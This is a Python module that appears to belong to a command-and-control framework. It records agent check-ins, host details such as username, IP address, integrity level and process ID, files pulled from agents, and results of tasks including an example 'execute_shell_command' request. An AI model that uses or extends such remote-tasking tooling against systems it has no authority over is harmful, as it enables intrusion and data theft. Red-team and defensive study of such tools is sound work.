import os
import datetime
import json

from connect.output import display
from connect.generate import string_identifier
from connect.convert import base64_to_string, base64_to_bytes
from .models import AgentModel, TaskModel

class ResultsHandler:

    def __init__(self, sio_client, session):
        self.session = session
        self.sio_client = sio_client
        self.task_types = {
            0: self.process_default_results,
            1: self.process_string_results,
            2: self.process_file_results
        }

    def process_results(self, task, results):
        self.task_types[abs(task.type)](task, results)

    def process_default_results(self, task, results):
        display(f'Results for {task.method} received', 'INFORMATION')

    def process_string_results(self, task, results):
        results = base64_to_string(results)
        task.results = results
        if task.type > 0:
            self.sio_client.emit('proxy', json.dumps(['success', f'{task.agent.id} returned results for `{task.method}`:\n{results}']))
        self.set_agent_properties(task, results)
        self.commit(task)

    def process_file_results(self, task, results):
        results = base64_to_bytes(results)
        file_name = f'{os.getcwd()}/instance/downloads/{string_identifier()}'
        with open(file_name, 'wb') as fd:
            fd.write(results)
        task.results = file_name
        self.commit(task)
        display(f'{task.agent.id} returned results for `{task.method}` wrote results to: `{file_name}`', 'SUCCESS')

    def set_agent_properties(self, task, results):
        agent = task.agent
        method = task.method
        if method == 'whoami':
            agent.username = results
        elif method == 'os':
            agent.os = results
        elif method == 'ip':
            agent.ip = results
        elif method == 'integrity':
            agent.integrity = results
        elif method == 'pid':
            agent.pid = results
        self.commit(agent)

    def commit(self, model):
        self.session.add(model)
        self.session.commit()


class TaskManager:
    def __init__(self, sio_client, session):
        self.session = session
        self.incoming_tasks = {}
        self.results_handler = ResultsHandler(sio_client, session)

    def parse_batch_response(self, batch_response: list) -> list:
        batch_request = []
        for task in batch_response:
            # ToDo: Verify JSON_RPC 2.0 compliance of `task`
            task_id = next((v for k, v in task.items() if k.lower() == 'id'), None)
            result = next((v for k, v in task.items() if k.lower() == 'result'), None)
            error = next((v for k, v in task.items() if k.lower() == 'error'), None)

            # process agent checkin
            agent = self.session.query(AgentModel).filter_by(check_in_task_id=task_id).first()
            if agent:
                batch_request = agent.get_tasks()
                agent.check_in = datetime.datetime.now()
                self.session.add(agent)
                self.session.commit()
                continue

            # process task results
            task = self.session.query(TaskModel).filter_by(id=task_id).first()
            if not task:
                display(f'Failed to find task with id {task_id}', 'ERROR')
                continue
            if result:
                task.completed = datetime.datetime.now()
                self.session.add(task)
                self.session.commit()
                self.results_handler.process_results(task, result)
                continue
            if error:
                task.completed = datetime.datetime.now()
                self.session.add(task)
                self.session.commit()
                display(base64_to_string(error['message']), 'ERROR')
                continue
        return batch_request


"""
Example Batch Response:

# Task successful with results
[
    {
        'jsonrpc': '2.0',
        'result': 'c2t5bGVyCg==',
        'id': '0123456789'
    }
]

# Task successful with results and we need to set an agent property
[
    {
        'jsonrpc': '2.0',
        'result': ['c2t5bGVyCg==', 'c2t5bGVyCg=='],
        'id': '0123456789'
    }
]


# Task failed without results because the method is not supported.
[
    {
        'jsonrpc': '2.0',
        'error': {
            'code': -32601
            'message': 'This method is not supported'
        }
        'id': '0123456789'
    }
]

Example Batch Request:

[
    {
        'jsonrpc': '2.0',
        'method': 'execute_shell_command',
        'params': ['d2hvYW1pCg=='],
        'id': '0123456789'
    }
]
"""
